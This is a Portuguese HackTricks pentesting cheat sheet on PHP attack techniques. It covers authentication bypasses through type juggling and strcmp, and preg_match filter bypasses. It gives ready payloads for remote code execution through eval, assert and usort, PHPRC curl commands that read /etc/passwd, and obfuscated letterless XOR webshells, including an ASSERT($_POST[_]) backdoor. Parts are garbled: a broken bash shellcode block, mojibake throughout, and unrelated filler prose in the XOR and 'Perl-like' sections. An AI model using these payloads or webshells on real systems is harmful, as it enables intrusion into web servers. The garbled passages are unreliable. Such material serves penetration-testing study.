# Truques do PHP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Localiza√ß√£o comum dos cookies:

Isso tamb√©m √© v√°lido para cookies do phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Localiza√ß√µes:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassando compara√ß√µes em PHP

### Compara√ß√µes fracas/Type Juggling ( == )

Se o `==` for usado em PHP, h√° casos inesperados em que a compara√ß√£o n√£o se comporta como esperado. Isso ocorre porque "==" compara apenas valores transformados para o mesmo tipo. Se voc√™ tamb√©m deseja comparar que o tipo dos dados comparados √© o mesmo, voc√™ precisa usar `===`.

Tabelas de compara√ß√£o em PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Uma string que n√£o come√ßa com um n√∫mero √© igual a um n√∫mero
* `"0xAAAA" == "43690" -> True` Strings compostas por n√∫meros em formato decimal ou hexadecimal podem ser comparadas com outros n√∫meros/strings com resultado True se os n√∫meros forem iguais (n√∫meros em uma string s√£o interpretados como n√∫meros)
* `"0e3264578" == 0 --> True` Uma string que come√ßa com "0e" e seguida por qualquer coisa ser√° igual a 0
* `"0X3264578" == 0X --> True` Uma string que come√ßa com "0" e seguida por qualquer letra (X pode ser qualquer letra) e seguida por qualquer coisa ser√° igual a 0
* `"0e12334" == "0" --> True` Isso √© muito interessante porque em alguns casos voc√™ pode controlar a entrada de string de "0" e algum conte√∫do que est√° sendo hashado e comparado com ele. Portanto, se voc√™ puder fornecer um valor que criar√° um hash come√ßando com "0e" e sem nenhuma letra, voc√™ poder√° contornar a compara√ß√£o. Voc√™ pode encontrar **strings j√° hashadas** com esse formato aqui: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Qualquer letra em uma string √© igual a int 0

Mais informa√ß√µes em [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** tamb√©m afeta a fun√ß√£o `in_array()` por padr√£o (voc√™ precisa definir como true o terceiro argumento para fazer uma compara√ß√£o estrita):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Se essa fun√ß√£o for usada para **qualquer verifica√ß√£o de autentica√ß√£o** (como verificar a senha) e o usu√°rio controlar um lado da compara√ß√£o, ele pode enviar um array vazio em vez de uma string como valor da senha (`https://example.com/login.php/?username=admin&password[]=`) e contornar essa verifica√ß√£o:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
O mesmo erro ocorre com `strcasecmp()`

### Convers√£o estrita de tipos

Mesmo se `===` estiver sendo usado, pode haver erros que tornam a compara√ß√£o vulner√°vel √† convers√£o estrita de tipos. Por exemplo, se a compara√ß√£o estiver convertendo os dados para um tipo de objeto diferente antes de comparar:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** pode ser usado para **validar a entrada do usu√°rio** (ele **verifica** se alguma **palavra/regex** de uma **lista negra** est√° **presente** na **entrada do usu√°rio** e, se n√£o estiver, o c√≥digo pode continuar sua execu√ß√£o).

#### Bypass de nova linha

No entanto, ao delimitar o in√≠cio da regexp, `preg_match()` **verifica apenas a primeira linha da entrada do usu√°rio**, ent√£o, se de alguma forma voc√™ puder **enviar** a entrada em **v√°rias linhas**, voc√™ pode ser capaz de contornar essa verifica√ß√£o. Exemplo:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Para contornar essa verifica√ß√£o, voc√™ pode **enviar o valor com quebras de linha urlencoded** (`%0A`) ou, se puder enviar **dados JSON**, envi√°-los em **v√°rias linhas**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Encontre um exemplo aqui: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Burla de erro de comprimento**

(Esta burla foi testada aparentemente no PHP 5.2.5 e n√£o consegui faz√™-la funcionar no PHP 7.3.15)\
Se voc√™ puder enviar para `preg_match()` uma entrada **muito grande** v√°lida, ele **n√£o conseguir√° process√°-la** e voc√™ poder√° **burlar** a verifica√ß√£o. Por exemplo, se estiver sendo feito um bloqueio de um JSON, voc√™ poderia enviar:
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
De: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

### Tipos de Juggling para ofusca√ß√£o em PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Executar Ap√≥s Redirecionamento (EAR)

Se o PHP estiver redirecionando para outra p√°gina, mas nenhuma fun√ß√£o **`die`** ou **`exit`** √© **chamada ap√≥s o cabe√ßalho `Location`** ser definido, o PHP continua executando e anexando os dados ao corpo da p√°gina:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Mais truques

* **register\_globals**: No **PHP < 4.1.1.1** ou se estiver mal configurado, o **register\_globals** pode estar ativo (ou seu comportamento est√° sendo imitado). Isso implica que em vari√°veis globais como $\_GET, se elas tiverem um valor, por exemplo, $\_GET\["param"]="1234", voc√™ pode acess√°-lo atrav√©s de **$param**. Portanto, enviando par√¢metros HTTP, voc√™ pode sobrescrever vari√°veis que s√£o usadas no c√≥digo.
* Os **cookies PHPSESSION do mesmo dom√≠nio s√£o armazenados no mesmo local**, portanto, se dentro de um dom√≠nio **cookies diferentes s√£o usados em caminhos diferentes**, voc√™ pode fazer com que um caminho **acesse o cookie do outro caminho** definindo o valor do cookie do outro caminho.\
Dessa forma, se **ambos os caminhos acessarem uma vari√°vel com o mesmo nome**, voc√™ pode fazer com que o **valor dessa vari√°vel em path1 se aplique a path2**. E ent√£o path2 considerar√° v√°lidas as vari√°veis de path1 (atribuindo ao cookie o nome correspondente a ele em path2).
* Quando voc√™ tem os **nomes de usu√°rio** dos usu√°rios da m√°quina, verifique o endere√ßo: **/\~\<NOME DE USU√ÅRIO>** para ver se os diret√≥rios php est√£o ativados.
* [**LFI e RCE usando wrappers php**](../../../pentesting-web/file-inclusion/) 

### password\_hash/password\_verify

Essas fun√ß√µes s√£o normalmente usadas em PHP para **gerar hashes a partir de senhas** e para **verificar** se uma senha est√° correta em compara√ß√£o com um hash.\
Os algoritmos suportados s√£o: `PASSWORD_DEFAULT` e `PASSWORD_BCRYPT` (come√ßa com `$2y$`). Note que **PASSWORD\_DEFAULT √© frequentemente o mesmo que PASSWORD\_BCRYPT**. E atualmente, **PASSWORD\_BCRYPT** tem uma **limita√ß√£o de tamanho na entrada de 72 bytes**. Portanto, quando voc√™ tenta gerar um hash de algo maior que 72 bytes com esse algoritmo, apenas os primeiros 72 bytes ser√£o usados:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Bypassando cabe√ßalhos HTTP abusando de erros do PHP

Se uma **p√°gina PHP estiver imprimindo erros e ecoando algum input fornecido pelo usu√°rio**, o usu√°rio pode fazer com que o servidor PHP imprima algum **conte√∫do longo o suficiente** para que, quando ele tentar **adicionar os cabe√ßalhos** na resposta, o servidor lance um erro.\
No cen√°rio a seguir, o **atacante fez o servidor lan√ßar alguns erros grandes**, e como voc√™ pode ver na tela, quando o PHP tentou **modificar as informa√ß√µes do cabe√ßalho, n√£o conseguiu** (por exemplo, o cabe√ßalho CSP n√£o foi enviado ao usu√°rio):

![](<../../../.gitbook/assets/image (465).png>)

## Execu√ß√£o de c√≥digo

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Verifique isso para mais fun√ß√µes √∫teis do PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Para executar o c√≥digo no argumento "replace", √© necess√°rio ter pelo menos uma correspond√™ncia.\
Essa op√ß√£o do preg\_replace foi **descontinuada a partir do PHP 5.5.0.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

Esta fun√ß√£o dentro do php permite que voc√™ **execute c√≥digo que est√° escrito em uma string** para **retornar verdadeiro ou falso** (e dependendo disso, alterar a execu√ß√£o). Geralmente, a vari√°vel do usu√°rio ser√° inserida no meio de uma string. Por exemplo:\
`assert("strpos($_GET['page']),'..') === false")` --> Neste caso, para obter **RCE**, voc√™ poderia fazer:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Voc√™ precisar√° **quebrar** a sintaxe do c√≥digo, **adicionar** sua carga √∫til e, em seguida, **corrigi-la novamente**. Voc√™ pode usar opera√ß√µes l√≥gicas como "**and" ou "%26%26" ou "|"**. Observe que "or" e "||" n√£o funcionam porque se a primeira condi√ß√£o for verdadeira, nossa carga √∫til n√£o ser√° executada. Da mesma forma, ";" n√£o funciona, pois nossa carga √∫til n√£o ser√° executada.

**Outra op√ß√£o** √© adicionar √† string a execu√ß√£o do comando: `'.highlight_file('.passwd').'`

**Outra op√ß√£o** (se voc√™ tiver o c√≥digo interno) √© modificar alguma vari√°vel para alterar a execu√ß√£o: `$file = "hola"`

### **RCE via usort()**

Essa fun√ß√£o √© usada para classificar uma matriz de itens usando uma fun√ß√£o espec√≠fica.\
Para abusar dessa fun√ß√£o:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Voc√™ tamb√©m pode usar **//** para comentar o restante do c√≥digo.

Para descobrir o n√∫mero de par√™nteses que voc√™ precisa fechar:

* `?order=id;}//`: obtemos uma mensagem de erro (`Parse error: syntax error, unexpected ';'`). Provavelmente estamos faltando um ou mais par√™nteses.
* `?order=id);}//`: obtemos um **aviso**. Parece estar correto.
* `?order=id));}//`: obtemos uma mensagem de erro (`Parse error: syntax error, unexpected ')' i`). Provavelmente temos muitos par√™nteses de fechamento.

### **RCE via .httaccess**

Se voc√™ pode **fazer upload** de um **.htaccess**, ent√£o voc√™ pode **configurar** v√°rias coisas e at√© mesmo executar c√≥digo (configurando que arquivos com extens√£o .htaccess podem ser **executados**).

Diferentes shells .htaccess podem ser encontrados [aqui](https://github.com/wireghoul/htshells)

### RCE via Vari√°veis de Ambiente

Se voc√™ encontrar uma vulnerabilidade que permita **modificar vari√°veis de ambiente no PHP** (e outra para fazer upload de arquivos, embora com mais pesquisa talvez isso possa ser contornado), voc√™ pode abusar desse comportamento para obter **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Essa vari√°vel de ambiente permite carregar bibliotecas arbitr√°rias ao executar outros bin√°rios (embora neste caso possa n√£o funcionar).
* **`PHPRC`** : Instrui o PHP sobre **onde localizar seu arquivo de configura√ß√£o**, geralmente chamado `php.ini`. Se voc√™ puder fazer upload do seu pr√≥prio arquivo de configura√ß√£o, ent√£o use `PHPRC` para apontar o PHP para ele. Adicione uma entrada **`auto_prepend_file`** especificando um segundo arquivo enviado. Este segundo arquivo cont√©m c√≥digo PHP normal, que √© ent√£o executado pelo tempo de execu√ß√£o do PHP antes de qualquer outro c√≥digo.
1. Fa√ßa upload de um arquivo PHP contendo nosso c√≥digo de shell
2. Fa√ßa upload de um segundo arquivo, contendo uma diretiva **`auto_prepend_file`** instruindo o pr√©-processador PHP a executar o arquivo que enviamos no passo 1
3. &#x20;Defina a vari√°vel `PHPRC` para o arquivo que enviamos no passo 2.
* Obtenha mais informa√ß√µes sobre como executar essa cadeia [**no relat√≥rio original**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - outra op√ß√£o
* Se voc√™ **n√£o pode fazer upload de arquivos**, voc√™ pode usar no FreeBSD o "arquivo" `/dev/fd/0` que cont√©m o **`stdin`**, sendo o **corpo** da solicita√ß√£o enviada para o `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ou para obter RCE, habilite **`allow_url_include`** e adicione um arquivo com **c√≥digo PHP em base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* T√©cnica [**desse relat√≥rio**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## An√°lise Est√°tica do PHP

Verifique se voc√™ pode inserir c√≥digo nas chamadas dessas fun√ß√µes (de [aqui](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Se voc√™ estiver depurando uma aplica√ß√£o PHP, voc√™ pode habilitar globalmente a exibi√ß√£o de erros em `/etc/php5/apache2/php.ini` adicionando `display_errors = On` e reiniciando o apache: `sudo systemctl restart apache2`

### Desofuscando c√≥digo PHP

Voc√™ pode usar o **site** [**www.unphp.net**](http://www.unphp.net) **para desofuscar c√≥digo PHP.**

## Wrappers e Protocolos PHP

Wrappers e protocolos PHP podem permitir que voc√™ **ignore prote√ß√µes de escrita e leitura** em um sistema e comprometa-o. Para [**mais informa√ß√µes, consulte esta p√°gina**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## RCE n√£o autenticado do Xdebug

Se voc√™ verificar que o **Xdebug** est√° **habilitado** em uma sa√≠da `phpconfig()`, voc√™ deve tentar obter RCE atrav√©s de [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Vari√°veis de vari√°veis
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Explorando RCE usando $\_GET\["a"]\($\_GET\["b"])

Se em uma p√°gina voc√™ pode **criar um novo objeto de uma classe arbitr√°ria**, voc√™ pode ser capaz de obter RCE, verifique a seguinte p√°gina para aprender como:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Executando PHP sem letras

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Usando octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

O operador XOR (ou exclusivo) √© uma opera√ß√£o l√≥gica que retorna verdadeiro apenas quando os operandos t√™m valores diferentes. Em PHP, o operador XOR √© representado pelo s√≠mbolo `^`.

O operador XOR √© frequentemente usado em t√©cnicas de criptografia e ofusca√ß√£o de c√≥digo. Ele pode ser usado para realizar opera√ß√µes de criptografia simples, como a cifra de um texto usando uma chave secreta.

Al√©m disso, o operador XOR tamb√©m pode ser usado para realizar verifica√ß√µes de paridade e manipula√ß√£o de bits.

Aqui est√° um exemplo de uso do operador XOR em PHP:

```php
$valor1 = 10;
$valor2 = 5;

$resultado = $valor1 ^ $valor2;

echo $resultado; // Sa√≠da: 15
```

Neste exemplo, o operador XOR √© usado para realizar uma opera√ß√£o de bit a bit entre os valores das vari√°veis `$valor1` e `$valor2`. O resultado √© armazenado na vari√°vel `$resultado` e, em seguida, √© exibido na tela.

O operador XOR √© uma ferramenta poderosa que pode ser usada em v√°rias situa√ß√µes de programa√ß√£o. No entanto, √© importante us√°-lo com cuidado e entender completamente como ele funciona para evitar erros e comportamentos inesperados.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### C√≥digo de shell XOR f√°cil

De acordo com [**este artigo**](https://mgp25.com/ctf/Web-challenge/), √© poss√≠vel gerar um c√≥digo de shell f√°cil desta maneira:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Ent√£o, se voc√™ pode **executar PHP arbitr√°rio sem n√∫meros e letras**, voc√™ pode enviar uma solicita√ß√£o como a seguinte abusando desse payload para executar PHP arbitr√°rio:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Para uma explica√ß√£o mais detalhada, consulte [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### Shellcode XOR (dentro de eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl-like

O PHP √© uma linguagem de programa√ß√£o que possui muitas semelhan√ßas com a linguagem Perl. Essas semelhan√ßas permitem que os desenvolvedores usem t√©cnicas semelhantes ao programar em PHP. Neste diret√≥rio, voc√™ encontrar√° v√°rias dicas e truques para aproveitar ao m√°ximo essas semelhan√ßas e escrever c√≥digo PHP de forma mais eficiente e concisa.

#### Express√µes Regulares

As express√µes regulares s√£o uma parte importante da programa√ß√£o Perl e tamb√©m podem ser usadas em PHP. Elas s√£o √∫teis para realizar correspond√™ncias de padr√µes em strings e realizar manipula√ß√µes de texto avan√ßadas. O PHP oferece suporte a express√µes regulares por meio da fun√ß√£o `preg_match()` e outras fun√ß√µes relacionadas.

#### Manipula√ß√£o de Strings

Assim como Perl, o PHP possui uma ampla gama de fun√ß√µes para manipula√ß√£o de strings. Essas fun√ß√µes permitem que voc√™ fa√ßa coisas como dividir uma string em partes, substituir partes de uma string por outra, converter letras mai√∫sculas em min√∫sculas e vice-versa, entre outras manipula√ß√µes de texto.

#### Fun√ß√µes de Array

O PHP tamb√©m possui muitas fun√ß√µes de array que s√£o semelhantes √†s encontradas em Perl. Essas fun√ß√µes permitem que voc√™ manipule arrays de forma eficiente, adicionando, removendo, ordenando e pesquisando elementos em um array.

#### Manipula√ß√£o de Arquivos

Assim como Perl, o PHP oferece recursos poderosos para manipula√ß√£o de arquivos. Voc√™ pode abrir, ler, gravar e fechar arquivos usando fun√ß√µes espec√≠ficas do PHP. Al√©m disso, o PHP tamb√©m oferece suporte a manipula√ß√£o de diret√≥rios, permitindo que voc√™ liste arquivos em um diret√≥rio e realize outras opera√ß√µes relacionadas a arquivos.

#### Outras Caracter√≠sticas Perl-like

Al√©m das caracter√≠sticas mencionadas acima, o PHP tamb√©m possui outras funcionalidades que s√£o semelhantes √†s encontradas em Perl. Isso inclui recursos como manipula√ß√£o de datas e horas, manipula√ß√£o de XML, suporte a sockets de rede e muito mais.

Ao aproveitar essas semelhan√ßas com Perl, voc√™ pode escrever c√≥digo PHP mais eficiente e conciso. Isso pode economizar tempo e esfor√ßo durante o desenvolvimento de aplicativos e scripts em PHP.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
